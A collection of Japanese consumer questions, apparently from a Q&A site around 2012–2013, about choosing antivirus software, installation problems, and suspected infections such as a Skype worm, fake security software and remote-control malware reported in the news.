バックドアの対策について教えて下さい。 私はアンチウイルスソフトとして、Microsoft Security Essentials（MSE）を使っているのですが、本日、MSEを開いたところ、「履歴」タブに２つのバックドアが検疫されていることが分かりました。 （検疫：実行しないように指定されたが、PCから削除されていない項目） MSEは常時監視モードにしているのですが、今回手動で開く前には一切アラーム等は発生しませんでした。 検疫されていたファイルは外部からダウンロードしたソフト名が記されていたので、そのソフトから感染したものと思われます。 バックドアであることは確認したのですが、ビックリしたものですから、直ぐに検疫されたファイルを削除してしまい、バックドアの種類は記憶しておりません。 その後、バックドアの恐ろしさをネット検索で知り、当該パソコンはネットから切り離しました。 （今は別のパソコンから質問を書いております） しかし、誤検出の場合も結構ある、という情報もあり、何をどこまで対策していいのか分からない状態です。 そこで、質問なのですが、MSEで検疫状態になっていても、やはりバックドアに感染したものとして考えるべきなのでしょうか？また、バックドアの種類や各種情報を確認したいと思っているのですが、MSEに過去に削除したウイルス等を検索する機能はあるのでしょうか。 （ネットで調べたのですが、情報が見つかりませんでした） 特に、前者の質問（検疫状態と感染の関連）について知りたいと思います。 その他、何かしら参考となる情報がありましたら、ぜひ教えて下さい。 よろしくお願い致します。
パソコンの初心者です。 ウイルス対策ソフトを購入しようとしたら知人よりマイクロソフトよりMicrosoft Security Essentials といったフリーのソフトがあるので 購入しない方はよいと忠告されました。Microsoft Security Essentials と一般的に販売しているウイルス対策ソフトとどの様に違いますか？ご指導お願いします、よろしくお願いします。
カカクコムを見るとまだ2013は安定していないようで大きなトラブル報告がいくつも見られます。設定変更尾が必須なようです。 セキュリティに詳しい方に質問なのですが初心者は2012を入れてそのまま使うのと２０１３で設定をカスタマイズして使うのはどちらが望ましいでしょうか。
ウイルス対策ソフトのclamxavをダウンロードしましたが、そのあとからのやり方がわかりません。 サイトを見て「２番目のプラグイン ScanWithClamXav.plugin は、ユーザ（ホーム） ＞ ライブラリ ＞ Contextual Menu Items　の中に移動する。 」とは？？？ そもそもライブラリがどこにあるのかわかりません。よろしくお願いします(T . T)
インターネットバンキングの口座から預金が不正送金された事件で 警察庁は、 マカフィー社の「トータルプロテクション」 シマンテック社の「ノートンインターネットセキュリティ」 カスペルスキー社の「アンチウイルス２０１３」 の３種類のウイルス対策ソフトで駆除できると言っていますが、 ・・・と言うことは、「ウイルスバスタークラウド」や「ESET Smart Security」などは、 駆除できないことになるのですか？ そんなことはないと思いますが、その道に詳しい方、教えて頂けると大変たすかります。 宜しくお願いいたします。
PCを更新し、もうじきパソコン初期インストールの某社の３か月お試し期間が終わるので、無料のウィルス対策ソフトに切り替えようと思っています。 前のPCではkingsoftを入れてましたが、最近はどこが良いのでしょうか？お教えください。
ウイルスバスター（先日最新版へのバージョンアップ完了）とMcAfee Security Scan Plus（無料）が入っています。２つの有料セキュリティーソフトを入れることはお互いに干渉しあい絶対に良くないことは理解してます。が、McAfee Security Scan Plusは無料でスキャンして問題点を探し出してくれるだけのソフトです。探し出すだけのソフトでも入っていると問題がありますか？たまに小さなウイルスが入るとウイルスバスターはすぐに処置してくれますし、McAfee Security Scan Plusは警告だけを発してくれます。（McAfee だけ反応する時もあります）
セキュリティソフトを比較したい場合、あるセキュリティソフトをインストールしてアンインストール しても完全にすべてのファイルが消えるわけではないと思いますが、 retunilを使って仮想化にした状態でセキュリティソフトをインストールして使い終わったら 再起動して元に戻すという事を繰り返して使い比べるという方法はどうでしょうか？
よくノートン体験版、３０日、６０日、９０日と記事がありますが、 ６０日と９０日がＨＰサイトでも見つかりません。 体験版６０日と９０日って実在するんでしょうか？
インターネットに接続すると、毎回、強制ダウンロードしますか？と問いかけてきます。 いつも拒否していますが、毎回メッセージが出ます。 対処方法を教えてください。　よろしくお願いします。
質問させてください windows　xp x64 Professional edition 64bitのPCを使用しております。 今となっては古いものですが とくに不具合も無く使用しておりました 先日までAvastという　アンチウイルスソフトを使っておりましたが プログラムが新しいものが出てると思い 自動でプログラムを更新したとたんにフリーズ やむをえず　削除しました。 対応する旧Avastをインストールしたいのですが、 最新のものしか手に入りません 他のウイルスソフトは少々動作が遅く できればAvastを使用したいのですが 何か方法はありませんでしょうか？
先日、PCを購入して、古いPCからデータを移したり、USBメモリーに入っているデータを移そうと思います。 そこで、以前から使っているUSBメモリーをPCに差したいのですが、 相当前、会社のPCに指したときに、セキュリティの部署から 『ウィルスを検知したんですけど・・・なんか変なもの差しました？』 と聞かれた記憶があります。 感染の恐れのあるUSBを差した場合、何か警告は出ますでしょうか。 また、そういうUSBを差した瞬間にPCに感染しますか。 PCは良く使うのですが、セキュリティ関係は全部まかせっきりだったので、無知なもので・・・。 詳しい方おられましたらよろしくお願いします。
まずは http://mainichi.jp/select/news/20121029k0000m040 … みんさんは「衝撃」でしょうか？ どしどし見解をお寄せ頂きたい。
パソコンを購入してから３年経ちます。 今、とっても困っています。 ずっとウイルスバスター2009（トレンドマイクロ社？）にお世話になっていました。 しかし、今月末で有効期限が満了になってしまうらしく、新しく契約したＳｏ－ｎｅｔの人に問い合わせをしたら、2009では対応できなくなるという事でした。 パソコンの基本情報がＳＰ１で新ヴァージョンに移行する事もできないらしく困っています。 ウイルスソフトとかウイルス対策など詳しく教えてください（；。；） 初歩的な事も分からないので、出来れば分かりやすい言葉だったら、うれしいです（＾0＾；） 会社ではシステムの方任せで、本当に詳しくなくて、こんな質問ですみません。 宜しくお願いします。
avast無料版・バージョン7を使用しております。 必要なアプリを落とそうとしていたのですが、 そこに含まれるデータの一つをウイルスと判断し強制削除。 それでインストールを試したのですができず。 仕方がないのでavastを停止させた上で落としてきてインストールしてみたら 何の問題なくインストが完了し問題なく稼働しております。 今後の参考にしたいのですが、もしこういう時があった場合、 そのデータはウイルスではないと判断させた上で強制削除などをさせない手段というのは あるのでしょうか？ 検索してもヘルプを見てもうまく見つけられなくて… ご存じの方いらっしゃいましたらご教授をお願いいたします。
皆様はネットのセーフサーチの設定どうしてますか？ 私は中にしてますがセーフサーチOFFにするとどうなりますか？
Ｆｉｌｅ　Ｒｅｓｔｏｒｅに感染させられました。 そんなもん知らなかったんでどうすればいいかもわからず調べたところいろいろソフトを更新してない と強制でいれられるようですね。 色々サイト見ましたが全く分かりません初心者っでも分かるように優しく教えて下さい。。 いろいろこうさくして有償版を買わせようとしているようです。 ウイルスバスター2012が入っています。 お願いします(ToT)
よろしくお願いします。 今回「ウイルスバスター」をインストールするのですが、ノートンセーフティーマインダーをアンインストールしないといけないとの表示がでました。 アンインストールしようとメルアドとパスを入力すると「再び試してください。保護者のメルアドとパスを正しく入力してください」とでます。 おそらくパスワードを失念してしまったのかもしれませんが、この状況からアンインストール方法はないでしょうか。本当に困っています。 ほぼ同時期にインストールした「インターネットセキュリティー」は先にアンインストールしました。
新しくパソコンを買ったのでそれについていたウイルスバスタークラウドの９０日試用版を使っています。 その後そのままウイルスバスタークラウドを引き続きダウンロードするか結構評判がいいカスペルスキーにするかで迷っています。 パソコンはWindow7　でCPUはセレロンプロフェッサB815です。 メモリは４Gでネットも２，３時間見るくらいです。 できれば安くすませたいです。 でもフリーソフトは手におえないです。 どうかアドバイスをよろしくお願いします。
PCがどうやらウィルスに感染したようでして、一定時間ごとに勧誘のホームページが立ち上がってきます。 インターネットに接続をしていなくても、空白のページが立ち上がり、その後接続すると、そのページがいつもの勧誘のページに変わります。 最初、フリーのスパイウェア退治ソフトをインストールしたのですが、検出された脅威を全て取除き、そのときは一度納まったのですが、翌日再度PCを立ち上げると同じ現象が起きてしまいました。 今度はフリーのウィルス退治ソフトを入れなおしたのですが、脅威が検出されませんでした。 次は有料のウィルス退治ソフトの体験版を導入したのですが、そちらでも検出されませんでした。 しかし、相変わらず、PC起動後3つから6、7つ、同じ勧誘の画面が立ち上がり、閉じてもすぐにまた立ち上がってきます。 最終的には専門の業者に頼むしかないのかなと思っているのですが、手間も費用も惜しい気がしてしまっています。 どなたか、良い知恵を授けてください。
Kaspersky2013を購入予定で、現在試用中です。 ネットワーク攻撃ということで、1日に数回下記のような表示がでます。 『　intrusion.win.LSASS.exploit　』 『　intrusion.win.DCOM.exploit　』 どのように対応するのが良いのでしょうか。
Adobe CS4でアップデートしてみると、アップデートできる内容はないというふうに表示されますが、 Kasperskyでは、脆弱性が検出されてしまいます。 脆弱性があるのは、InDesignと、Flash Player 10(Adobe Flash CS4)です。 これは放置しても良い物なのでしょうか。 また、何か対策の方法はあるのでしょうか。
こんにちは。 質問させてください。 今日、いつも使っている動画サイトの自分の視聴履歴を見たら、 自分の見たことの無い動画がずらっと並んでいました。 誰かが私のPCを使った可能性は0です。 それらの動画の再生した時間を見ると、ちょうど動画の再生は間を置かずに順々に再生していって いるようでした。 すぐにウイルスチェックをしましたが、何もひっかからず。 最近遠隔操作が～なんていうニュースをよく見るので、ちょっと怖いです。 今までこんなこと無かったのですが、こういう事って普通ある事なのですか？ よろしくお願いします。
AVG FREE　2013 ですが、 インストールの際に「製品を構成してます、、」のところから、 先に進みません。何度やっても同じです。 何度もインストール試しましたが、無理です。 一度、長く待ってみたところ、1時間経過しても、インストール終了しませんでした。 ちなみに、他、ウィルスソフトはアンインストールしてあります。 どうすれば、インストールできるかお願いいたします。
ＷｉｎＸＰのデスクトップＰＣから、ＯＣＮの光回線でネット接続をしています。セキュリティは、ニフティのオンラインセキュリティ「常時安全セキュリティ２４」を導入し、常に最新バージョンに更新し、ウイルス定義も最新のものにしています。スキャンは推奨の完全スキャンを行っており、ウイルスもスパイウェアも、過去一度もヒットしたことはありません。 この状態であれば、ウイルスや外部からの侵入に関して、完全に安心して良いのでしょうか。少し気になるのは、ウイルススキャンが途中で何時間も止まり、手動停止したことが何度かあったり、タスクマネージャのＣＰＵ使用率があまり上がっていないのに、ハードのアクセスランプがほとんど連続点灯状態になり、ネットへのアクセスだけでなく、通常のソフトを開いたり走らせたりするのにとても時間がかかることが増えて来たことです。ひどい時には、メモ帳でテキストファイルを開くのに、１分近くかかったりすることもあります。 なお、画像や動画などの重いファイル類は外付けＨＤＤに保存し、本体の４０ＧＢ容量のＨＤＤは半分近く空いています。 上記のような状態で、例えばウイルスがセキュリティの裏側で動いていたり、作動を妨害したりしている可能性はあるのでしょうか。一番恐れているのは外部からの侵入で、最近の遠隔操作事件を見てとても不安になりました。 なお、私はＰＣの専門知識はありませんので、自分でウイルスを発見したりするようなことはできません。できればあまり専門的でない、平易な言葉でご教示いただければ幸いです。 お詳しい皆様、よろしくお願いします。
「SoftwareDistribution」とかどこでもウィルスが入る込むことはあるのですか？素人です
私のＰＣでは、アンチウイルスソフトに、ＮＴＴ西日本のセキリュティー対策ツール（ver.5）を使っていますが、ほかのフリーアンチウイルスソフトに切り替えようと思っています。 よく名前を聞くのは、MSE、avast!、COMODO、Avira、ＡＶＧなどですが、どれにしたらいいのかわかりません。 できるだけ軽くて、検出力もちゃんとあるものがいいです。 ここに名前を挙げたもの以外でも、おすすめのフリーアンチウイルスソフトがあれば教えていただけると嬉しいです。 また、「別にソフト変える必要ないんじゃないか？」的な意見でも構いません。
ubuntuのセキュリティが強いのは http://ankyo.blog.so-net.ne.jp/2011-05-22 から納得しました。そこで質問なんですが、 １、全ポートを閉じてると書いてありましたが、インタネット接続時もポートは閉じたままなのでしょうか？ ２、ubuntuソフトウェアセンターからのpsensorというアプリがあるのですが、標準のままでは温度が表示されず、ネットでcpuの温度表示されるコマンドを見つけて、コマンド入力しました。こういったソフトウェアセンターのアプリを改造するコマンドはポートが開く可能性は ありますでしょうか？ちなみに今回みつけたサイトは↓です http://ankyo.blog.so-net.ne.jp/2011-05-22 ３、上記のコマンド大丈夫でしょうか？後悪意のあるコマンドを載せているサイトとかも可能性として高いでしょうか？ ubuntuマガジンの本やネットサーフィンしてたら普通に使う分感染しないと書いてありましたので心配になりました。→アプリ改造件 4,まじめな話ubuntu12.04のセキュリティでアダルトサイトを見るのは危険でしょうか？ネットサーフィンしてclamtkでスキャンすると３日に1回ほど2件ほど検出されます。ubuntuで画像保存方法なくてその時の画像がなくてすいません。 ５、firewall configrationのファイヤーウォールアプリあるのですが、使う必要はないでしょうか？ すごく不安なんで教えてくれるとありがたいです。宜しくお願いします。
PCを起動してインターネットをしようとするとスタートページがhttp://celebrity-gossip.netになることがあります。 毎回ではありません。 トレンドマイクロのウイルススキャンでも危険は出ず、クッキーやキャッシュの削除をした後でも出ます。 現在インストールされているプログラムの中にも怪しいものはありません。 原因が思い当たらず、質問します。 どこを見れてどんな操作をすればよいか、教示ください。 環境はWinXP　ブラウザはfirefox　16.0.1です。
今まで、Security Essentialsで凌いでいましたが、昨今のニュースなどを見ていて怖くなり、Kasperskyを購入しようと思っています。 現在、試用版をインストールしており、完全スキャンしてみると、トロイが2つほど出てきたり、脆弱性のあるプログラムがいくつも見つかったりと、危ない環境で使ってたのだなと驚きました。 自動でスキャンする設定などをしたいのですが、どの程度の期間でスキャンするのが適当でしょうか。パソコンはほぼ毎日使用し、電源も入りっぱなしの状態が多いです。 また、起動時にネットワーク攻撃を受けていますなどのメッセージが出てきますが、これはどのような対策をしたら良いのでしょうか。
新しいＰＣを買ったのですが、前のＰＣで使っていたノートンを入れたいと思っています。 （確か３台まで対応できるはずです。ノートン360） 新しいＰＣに９０日のノートンが入っていてとりあえず今はそれを使っています。 指定のサイトからダウンロードするのだと思われますが、その際新しいＰＣに 前から入っていたノートンはアンインストールしておくのでしょうか？ どうすればうまくいくのでしょうか？ よろしくお願いいたします。
ウイルスに感染してしまいました。リカバリするしか方法がないのでしょうか？ 知ってる限りの知識をなんでもいいので教えていただけるとありがたいです… 少し長くなるのですが状況を説明させていただきます。 少し前からアドウェアに感染していてESETでチェックしても何も検出されなくて アドウェアは特に問題を起こさないと聞いたので、パソコンの設定が確かに少し変えられているような気がしたけれど、忙しかったので少し放置していました。 そして、ESETをアンインストールして、Spybot(アドウェアが感知できるヤツ)をダウンロードして、うまく行かなかったので 今度はSupe Anti Spywareに変えたところ、マルウェアが95個と、Trojianだったかな…？(これってトロイの木馬？)に1つ感染してることが わかったところで、強制終了されてしまいました。(ボタン押してスイッチ切ったような感じです)相性が悪かったのかなとも思ったので マカフィー(体験版)に変えてみたところ、やっぱり強制終了されました。 あと設定を、保護を有効にする、にチェックを入れると入れたそばでリアルタイムに2秒後くらいにすぐに無効に書き換えられます。 思えば、相性が悪いのかと思ってアンインストールしましたが、 ノートンもうまく行きませんでした。(ダウンロードしようとしたら別のサイトに飛ばされる、ダウンロードしてみたら展開前のファイルが 展開しても展開しても出てきて、うまくいかない。) あと携帯とE-Mobleはウイルスに感染しないはずだと思うので気のせいかとは思うのですが 最近、パソコンと繋いだら携帯の設定がいろいろ変ってて調子がおかしくなってました。E-mobleの設定？もなんか変っていて…。 そんなこともあったので、もしかしたら、電波系のものが壊れる何かが出てるのかも、っていうことに期待していたのですが、 (Super anti spyware以外ではいまのところ何も検出されたことがありません 　クイックスキャンだと。完全な検査はまあ強制終了されるから、ですけどね…) いちいち、セキュリティ関係ばかり邪魔されるのはやっぱり、感染してる所為ですよね。これってリカバリするしか方法がないのでしょうか… FX(一種のお金の取引)をふつうに行っていて、データもたぶん何も消えてないし、いまのところ被害はないのですが…。 これは何がどうなってるやら　この場合どうしたらいいのか… 知ってる限りの知識をなんでもいいので教えてください　よろしくお願いします。 リカバリってつまりバックアップですよね？ 自分が書いた小説やイラストが、前のバックアップに入っていないので リカバリはしたくないです…
system progressive protectionという偽セキュリティーソフトなのですが、 突然ダウンロードされて以降パソコンが使えなくなりました。 リカバリーせずに再び使用する事は難しいのでしょうか。 ちなみにパソコンには購入してインストールしたようなセキュリティーソフトは入っておりません。 反省です。。 ご回答宜しくお願い致します。
スカイプのウイルスに感染してしまい、 その後ウイルスを綺麗さっぱり消すバッチソフトをやったり、 パスワードを変えたり、対処方法を色々やりましたが消えません グーぐるクロームではネットは開けますが ウィンドウズでは開けません もうどうしたらいいんですか？？？？ ＰＣは素人同然なので分かりません 助けてくださいお願いします
唐突に終わりましたね。 2020年まで使えるという約束は何だったんだという気分です、どうせならスーパーセキュリティと交換して欲しい。 終了はコーレルさんの影響でしょうか？ ＊３ライセンス9台分もっていますが、忘れた頃に起動する古いノート1台しか使っていません！！
http://shopap.lenovo.com/jp/products/tablets/ide … この商品は、ウイルスに感染する場合がありますか？ 〔する場合：どうすれば防げますか？〕
http://www.acer.co.jp/ac/ja/JP/content/model/XE. … この商品は、ウイルスに感染しますか？ 〔感染する場合：どうすれば防げますか？〕
つい１か月前に、ノートン３６０を購入したのですが、 突然携帯電話をスマートフォンに替える事になり、 アンドロイドの不安もいろいろ耳にするので、これにもセキュリティソフトを入れたいなと思ったのですが・・・「１ユーザー３台までインストール可能」ノートンがあるじゃないですか・・・ しかし、ノートン３６０マルチデバイスというのにしていないと、スマホには入れられないみたいです。 ほんのちょっと購入のタイミングが悪かったのですが、 このノートン３６０を、ノートン３６０マルチデバイスにアップグレードする事って可能でしょうか？
スカイプでのウイルスについての質問です。 　3日前ぐらいにスカイプのコンタクトは持っているけど、一回も話したことの無い人から「これはあなたの新しいプロフィールですか？」という文の後に、リンクが貼られていました。あきらかにおかしいし.exeファイルだからあやしいとはおもったのですが、スカイプの一応は友達であるということで、少し安心していました。それを意味もわからずDLした自分も馬鹿で、最近ウイルスのニュースが話題の中気をつけていたつもりなのですが、やはりウイルスでかってにじぶんがでてきたのと同じ文をほかの友達全員に送ってしまうというものでした。それをほかの人がクリックすると多数の人に広まってしまうというタイプのものでした。 そこで質問ですが、Cドライブまで削除したのに今ウイルスバスターの効果を消すと同じ現象が起こってしまいました。 なぜCドライブを削除したのにまだでてくるのでしょうか？ Dドライブのほうが問題なのでしょうか？　skypeのほうが問題なのでしょうか？
最近ニュースで　他人がパソコンを　遠隔操作し　悪いことをした為　パソコンの持ち主が警察に逮捕されたと報じられていますが、(1)　ＯＫＷＡＶＥに質問し　回答を見ることは安全でしょうか？　(2)　また　回答の中で　ＵＲＬ　を紹介される場合がありますが、このＵＲＬにアクセスする場合の危険性はありますか？
Win7です。 何かのプログラムを起動すると、画面が暗くなり、 このプログラムを起動しますか？「はい・いいえ」の画面が出ますよね？ これが、自分がアイコンをクリックした場合なら安心なんですが、 Javaの自動アップデートで、不意に出る事があります。 詳細を見ると、Javaのものなので大丈夫だと言う事でしょうけど、 ウィルスが、Javaのある位置を指し、Javaのプログラムだと偽って、 「はい」を押させようとしたり、同様に、誰のPCにも入っているような 安全なプログラムの起動だと装うダイアログ「はい・いいえ」を出させ、 ユーザーを欺く可能性はあるのでしょうか？ それとも、あのダイアログに書かれている内容、パス、プログラム名は、 信用しても大丈夫なのでしょうか？ 疑いだしたらきりはありませんが。(;^^)
最近ウィルスに感染して、間違って逮捕されていますが、感染してもネットにつながなければ自動的に立ち上げてネットにつなげる問ことはないのでしょうか？ 私はダウンロードするときはハーディスクを２台つけていて、ダウンロード用のディスクで立ち上げてそちらからダウンロードしています。気になるのは普段のディスクはスウィッチが入ってデーターディスクにしていますがこれでは意味がなうのでしょうか？また、EXでないソフトでなければ感染しにくいと聞きましたが、ダウンロードすれば同じですよね。
先日、サイトを閲覧していたら、 system progressive protection というウィルス？に感染してしまいました。 対処法を調べようとブラウザを開いても、 英語のサイトに自動的にジャンプなどをしていました。 何とか携帯で調べて操作し、駆除自体は出来たかと思うのですが、 それ以降、ブラウザ…というか、Googleの検索がきちんと機能しません。 キーワードを検索すると、検索結果は出るのですが、 結果から各サイトへのページへ飛ぼうとすると、英語のサイトに飛ばされてしまいます。 他のブックマークやサイトのリンクなどは、今の所は特に動作に不具合などはみられません。 system progressive protection 自体が、 放っておくとPC上の色々な設定を勝手に弄るものだと聞いたのですが、 この場合、どのようにしてブラウザの機能を元に戻すことができるのでしょうか？ 使用ブラウザはIE8、OSはWindows7です。 宜しくお願い致します。
av test orgのテストでzone alarm anti-virus +firewallがかなり高い評価を受けていますが、 高性能なソフトなのでしょうか？
ウイルス対策で、クラウド型がいいのかオンラインスキャンがいいのか迷っています。 そもそもこれらはどう違うのでしょうか。ハッカー対策になるのはどちらでしょうか。
今回の騒動でウイルスに気づいて仮に再セットアップしていたとしたらウイルス感染の証拠が消えるか復元困難になって不利な状況に陥る様な気がします。ここで多くの回答者がウイルス感染時の対策としてリカバリーを進めていますがそれは本当に正しいのでしょうか？人に進める時何というかでなく自分がウイルス感染を疑ったとき自分はどうするか自分だったらリカバリーするかどうかを教えてください。
http://blog.livedoor.jp/waranewsplus/archives/18 … okwaveで人気の割に新種遠隔操作ウイルスへの対応は普通で特別優れてるわけではないようにみえます。やはり価格なりなんでしょうか。 また、安全性重視の場合カスペルスキーは選択しないとしてノートンバスターマカフィはどれが最善でしょうか？
以下の３つのウィルスが、無料のウイルス対策ソフト | KINGSOFT　で発見されました。 win32.Troj.Generic.(kcloud) C\Users\X\Downloads\PDFReaderSetup.exe win32.Troj.Agent.ge.(kcloud) C\Users\X\Downloads\PDFCreatorSetup.exe win32.Troj.Hoax.(kcloud)C\Users\X\AppData\LocalLow\FunWebPro ducts\Installr\Cache\05A4499A.exe どのような危険性があったでしょうか？ 私自身は、パソコンの動きが悪いように感じて、以下のセキュリティソフトを試しましたが検出されませんでした。 ・Microsoft Security Essentials ・AVG Anti-Virus Free Edition ・McAfee そして、 KINGSOFTで検出！ 新種のウィルスなのでしょうか？ 遠隔操作とか最近聞くのでとても不安です。 なんでもいいので情報ください。
皆さん、こんにちは。 PCでnet shoppingやnet bankingをしているのですが、その時入力した暗証番号やカードの番号はPC内に保存されるものなのでしょうか？ 最近のPC乗っ取り騒動で心配になり、もし保存されているようならば、消去したいと思ってます。 どなたかご存知の方、ご教授下さい。 宜しくお願いします。
いつも「教えて！goo」を参考にさせてもらっています。 いろいろとインターネットで調べたのですが、わからなかったので書き込みいたします。 LANに接続したwindows xp PCのセキュリティについて教えてください。 windows xp PCでこれまで使い慣れたソフトをできるだけ長く使用したいので、 マイクロソフトのサポートが切れる前に以下のような考えで LANを構築してセキュリティが確保できれば、 windows xp PCが壊れるまで使用できると考えましたが、 セキュリティの問題がどうにもわからないので教えてほしいのです。 PCなどに詳しくないので、よろしくお願いいたします。 考えたLANですが、 windows7（Home Premium)のノートPC（以下、7HomePC）に2台のwindows xp PC（以下、xp PC ）をHUBで接続します（同じワークグループ名にして3台の間だけでデータのやり取りをする）。 そして、この7HomePCは社内の無線LANかイーモバイルの端末で無線でネットに接続し、Dropboxを介して別のwindows7デスクトップや自宅のwindows7のノートPCに同期させます。 xp PCで作業するときは7HomePCにHUBを介してアクセスして作業し、再び、7HomePCのDropbox同期フォルダに保存します。 そこで教えてほしいのですが、xp PC でインターネットは行いませんので、サクサク動いてもらいたいためセキュリティソフトは入れません。また、インターネットにつながない（ブリッジ接続もしません）ので、xp PCのwindowsアップデートも行いません。 このような場合、以下の点が心配ですが、どなたか教えていただけばありがたいです。 1. 7HomePCにはセキュリティソフトが入れ、また、windowsアップデートを行い、パブリックネットワークのパスワード保護を行えば、他人からアクセスされることはないのでしょうか？ 2. 7HomePCにLAN接続した2台のxp PCへも他人からアクセスされることはないのでしょうか？ 3. xp PCは無防備なセキュリティ状態でありますが、ゲートウェイの役目を果たしている7HomePCは上記のようなセキュリティを施せば、7HomePCとのHUBを介したLANで間接的にインターネットにつながっているxp PCは外部から攻撃されることはないのでしょうか？ 以上です。長々と書いてしまいましたが、よろしくお願いいたします。
このたび新しいPC購入に伴い、前のPCの総合セキュリティソフトを継続 するか新しいソフト変更しようか検討中です。 前のがキャノンのNOD32で（対応OSがこのソフトしかなかった理由もあり） 動作も軽くて大きなトラブルもなかったのですが、長年使ってたので 今回OSも新しくなったことだし、別のも色々試してみたくなりました。 新しいPC環境です。 Windows7 HomePremium32ビット CPU:インテルceleronブロセッサーB820 メモリ:4GB ブラウザ:IE9 NOD32以外で使ってみたいのはマカフィー、F-Secure、カペルスキー。 実際に使うと動作の重さはどうなのでしょう？ NOD32の前に使ってたノートンはストレスの溜まる重さでした。 メジャー、マイナー問わずお薦めのアンチウィルスソフト（ファイヤーウォール& スパイウェア駆除機能付き）を教えていただけたら助かります。 フリー以外を希望します
最近「なりすまし誤認逮捕」のニュースがありましたが、このヤフーのアカウントで、普段と違う方法で誰かがログインしたとアラートが来ました。過去にpaypalで勝手にクレジットカードがカナダで使われ、気付いて返金して貰えた件があります。 OSはVISTA、セキュリティーはAVIRA(無料版)です。 それで伺いたいのですが、PC全体のスキャンは定期的に週に2度はしていますが、引っかかった事はありません。 しかしウィルスに感染したメールが何度か来た事はあるのですが、その様なメールは、届く前にファイアーウォールやAVIRAで引っかからないのですか？ 又、自分のPCが感染してるかどうかを知る為にAVIRAで全体スキャンをしている訳ですが、何となく良く分かりません。 勝手にアカウントに入られた場合、ヤフーからの説明通りパスワードを変えれば次から予報出来るのですよね？勝手に入ったとして何をするのでしょうか？なりかわって質問ですか？ちなみにヤフーメールは使っていません。 取り敢えず不安になりまして、質問させて頂きます。
PCがRECYCLERというウィルス？にかかってしまい普段使用しているポータブルHDDのフォルダがショートカット扱いにされてしまいました。 しばらくしてウィルスセキュリティソフトであるウィルスバスタークラウドが「PCから脅威が発見されたためこれらのファイルを除去しました」と表示されました。 一度PCを再起動し再びポータブルHDDの中を見てみるとショートカットになっていたフォルダがなくなっていました。 ポータブルHDDにまだウィルスがあるのかと思いウィルスバスタークラウドでポータブルHDD内をスキャンしてみました。 スキャンの途中でなくなってしまったフォルダの名前がちらほらと確認することができました。 フォルダオプションでポータブルHDD内の隠しフォルダを表示する設定にしてもそのフォルダは姿を現しませんでした。 インターネットで調べていろいろな方法を試しましたが消えたフォルダは再び表示されることはありませんでした。 容量もウィルスに感染する前と変わりませんし、HDDのデータ復元ソフト「復旧天使NTFS」でも消えたフォルダが確認できました。 また使えるようになる方法はないのでしょうか？ 普段使っているフォルダなので非常に困っています。 どなたか解決方法を教えてください。
今無料ウィルスソフトはいくつもありますが、信頼性が十分高いものはあるのでしょうか。 そろそろウィルスソフトの更新時期なのですが無料のものにも有料のものに匹敵する信頼性のあるものがあるなら変えようかなと思っています。 しかしいくつも種類があることや、無料で信頼性の高いウィルスソフトが作れるなら有料のウィルスソフトが普及するはずがない気もして迷っています。 詳しい方がいらっしゃれば無料のウィルスソフトについてご教授願えませんか。 （信頼のおける無料ウィルスソフトはあるのか、やはり有料のものにしたほうがいいのか、など） よろしくお願いします。
最近はやっているスカイプのウイルスに感染してしまい、 パスワードをかえて、ウイルスのサイトで調べ駆除もできたのだと思うのですが、 いきなりスカイプの画面が開かれてしまい、 なんたらのアクセスを許可するとかなんとかが上のあたりにでてきます 拒否するにして、スカイプの画面を閉じようとするのですが消えません。 それどころか最小化も、縮小することもできません これってウイルスまだ残ってるんですか？？ 対所の仕方ありますか？？
wordpressのプラグイン「404 Notifier」からのメールだったのですが、なりすましだった可能性があると警告がありました。開いただけで、メールはすぐに削除しました。 その後、デスクトップのテーマやフォルダオプションが勝手に変更されていていました。 もしかするとウイルスに感染したのでしょうか？最近、遠隔操作のニュースもありましたし、とても不安です。 また、もしウイルスに感染しているとしたらどうしたらいいでしょうか？ セキュリティソフトはフレッツ光のセキュリティツールを使用しています。
kaspersky2013でセーフデスクトップを使う方法を教えてください。
パソコンメールでＯｕｔｌｏｏｋを使っていますが　最近2点おかしなことに気づきました。 １．Ｏｕｔｌｏｏｋの進行度の画面がでて　何度も　自動で送信をしているようです。 　エラーは　 タスク’ｐｏｐ。ｅｏｎｅｔ．ｎｅ．ｊｐ－送受信中エラー（０ｘ８００４２１０Ａ）をｊ報告しました。’受信（ｐｏｐ）サーバーからの応答を待機中に操作がタイムアウトになりました。このメッセージを引き続き受信する場合は、サーバー管理者かインターネットサービスプロバイダ（ＩＳＰ）に問い合わせてください。 　メールの送信をしていないのに　勝手に　メールの送信をしているようです。 　（送信トレイには何も入っていません） ２．受信メールに 　Mail Delivery System [MAILER-DAEMON@eo.k-opti.ad.jp]　で　件名Error Mail 内容は 　The eo mail servers were unable to send this message. Message in Japanese: eoメールサーバはこのメールを送れませんでした。 指定した宛先は存在しないか、受け取れない状態である可能性があります。 <kt1936@s2.dion.ne.jp>: host mx.s.dion.ne.jp[210.141.108.179] said: 550 <kt1936@s2.dion.ne.jp>: User unknown (in reply to RCPT TO command) このようなメールを送ったことはないのですが　ウィルス等で勝手に　メールを送っているのでしょうか。 セキュリティソフトは　ＮＯＤ３２で随時更新をしています。 勝手に　情報を送信しようとしているのではないかと心配しています。 確認すべきことをお教えください。
無料のセキュリティが最近の事件で怖くなり、今度はカスペルスキーにしてみました。初心者でも、意外と使いやすいです。 でも、楽天市場のトップページがシンプルすぎる感じになりました。これでいいのですよね？ あと、無名のショップに制限がかかりすぎ、購入できませんでした。これは、そういうところにアクセスしないほうがいいと、教えてくれていると考えたほうがいいでしょうか？値段が近いならアマゾンにしたほうがいいということですかね？ 初心者で、あと気をつけることとか、教えてください。意外と軽いので今は気に入りましたが、ブロックがかなりきつい目ですよね。緩くする必要があれば教えてください。
いつも誤検知されるソフトのほかに afterconnectというソフトが検出されたのですが これってどういうソフトかご存知の方教えていただけますでしょうか。
いま問題の「iesys.exe」とか言うウィルスですが。 プログラムは遠隔操作で削除され、発見されていなかった。 しかし「不正プログラムが起動した形跡」が見つかった。 と言うニュースです。 この痕跡って、どこで分るんでしょうか？
eset smart security 5.2を使っています。 これのfirewallを停止して別のfirewallを入れても不具合は起きないでしょうか？
